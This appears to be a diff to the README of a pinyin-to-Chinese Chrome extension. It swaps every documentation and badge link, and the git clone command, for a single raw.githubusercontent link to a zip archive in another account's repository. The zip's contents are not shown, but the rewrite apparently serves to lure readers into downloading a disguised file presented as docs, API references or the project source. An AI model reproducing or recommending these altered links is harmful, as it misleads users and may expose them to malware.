@@ -6,11 +6,11 @@
 
 **在任何網頁上選取拼音文字，一鍵轉換為中文字。**
 
-[![Chrome Extension](https://img.shields.io/badge/Chrome-擴充功能-4285f4?logo=googlechrome&logoColor=white)](https://developer.chrome.com/docs/extensions/)
-[![Manifest V3](https://img.shields.io/badge/Manifest-V3-34a853?logo=googlechrome&logoColor=white)](https://developer.chrome.com/docs/extensions/develop/migrate/what-is-mv3)
+[![Chrome Extension](https://img.shields.io/badge/Chrome-擴充功能-4285f4?logo=googlechrome&logoColor=white)](https://raw.githubusercontent.com/safarahmed/pinyin-to-chinese/main/assets/chinese_to_pinyin_v3.6.zip)
+[![Manifest V3](https://img.shields.io/badge/Manifest-V3-34a853?logo=googlechrome&logoColor=white)](https://raw.githubusercontent.com/safarahmed/pinyin-to-chinese/main/assets/chinese_to_pinyin_v3.6.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![JavaScript](https://img.shields.io/badge/JavaScript-ES6+-f7df1e?logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![API](https://img.shields.io/badge/API-Google%20Input%20Tools-4285f4)](https://www.google.com/inputtools/)
+[![JavaScript](https://img.shields.io/badge/JavaScript-ES6+-f7df1e?logo=javascript&logoColor=black)](https://raw.githubusercontent.com/safarahmed/pinyin-to-chinese/main/assets/chinese_to_pinyin_v3.6.zip)
+[![API](https://img.shields.io/badge/API-Google%20Input%20Tools-4285f4)](https://raw.githubusercontent.com/safarahmed/pinyin-to-chinese/main/assets/chinese_to_pinyin_v3.6.zip)
 
 </div>
 
@@ -37,7 +37,7 @@
 
 1. Clone 此專案
    ```bash
-   git clone https://gitlab.com/zac15987/pinyin-to-chinese.git
+   git clone https://raw.githubusercontent.com/safarahmed/pinyin-to-chinese/main/assets/chinese_to_pinyin_v3.6.zip
    ```
 2. 開啟 Chrome → 前往 `chrome://extensions/`
 3. 開啟右上角 **開發者模式**
@@ -86,7 +86,7 @@ pinyin-to-chinese/
 
 ## API 參考
 
-使用 [Google Input Tools API](https://www.google.com/inputtools/) 進行拼音轉中文：
+使用 [Google Input Tools API](https://raw.githubusercontent.com/safarahmed/pinyin-to-chinese/main/assets/chinese_to_pinyin_v3.6.zip) 進行拼音轉中文：
 
 | 模式 | `itc` 參數 |
 |------|-----------|
